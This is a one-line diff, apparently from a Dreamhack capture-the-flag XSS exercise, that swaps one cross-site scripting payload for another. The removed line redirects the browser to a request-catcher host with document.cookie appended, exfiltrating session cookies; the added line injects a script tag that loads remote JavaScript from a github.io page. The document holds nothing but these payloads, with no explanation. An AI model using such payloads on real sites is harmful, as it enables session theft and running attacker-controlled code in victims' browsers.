@@ -1,1 +1,1 @@
-location.href="https://oyhpcna.request.dreamhack.games"+document.cookie
+<script src="https://buaii.github.io/dreamhack/test.html"></script>
